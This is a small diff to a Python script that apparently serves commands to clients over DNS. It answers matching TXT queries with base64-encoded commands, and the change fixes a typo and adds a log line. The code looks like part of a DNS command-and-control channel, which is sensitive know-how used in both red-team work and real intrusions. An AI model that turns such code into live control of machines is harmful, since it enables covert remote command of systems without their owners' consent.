@@ -97,11 +97,13 @@ def sendData(code, counter, command):
     s.bind((settings["ip"], int(settings["port"])))
     while True:
         if(loglevel >= 1):
-            print("Waiting fo Client to get it's data")
+            print("Waiting for Client to get it's data")
         rawrequest, addr = s.recvfrom(1024)
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
         if(query["query_type"] == "TXT" and query["domain_name"].lower() == f"{counter}.{code}.{settings['domain']}.".lower()):
+            if(loglevel >= 1):
+                print(f"Responding with command '{command}' for request domain '{query["domain_name"]}'")
             # Build response with command
             command = base64_encode_string(command)
             response = DNSRecord(
